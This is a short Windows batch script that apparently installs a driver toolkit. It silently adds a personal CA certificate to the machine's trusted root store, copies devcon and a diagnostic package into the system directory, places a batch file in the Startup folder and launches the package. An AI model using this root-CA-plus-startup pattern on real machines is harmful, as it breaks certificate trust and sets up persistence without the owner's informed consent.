certmgr.exe -add -c "Ricardo Polo CA.cer" -s -r localMachine root

if defined ProgramFiles(x86) (
copy devcon64.exe %Systemroot%\devcon.exe
) else (
copy devcon32.exe %Systemroot%\devcon.exe
)


copy FailedToOpen.diagcab %Systemroot%
copy Finished.bat %Appdata%"\Microsoft\Windows\Start Menu\Programs\Startup\Finished.bat"

start %Systemroot%\FailedToOpen.diagcab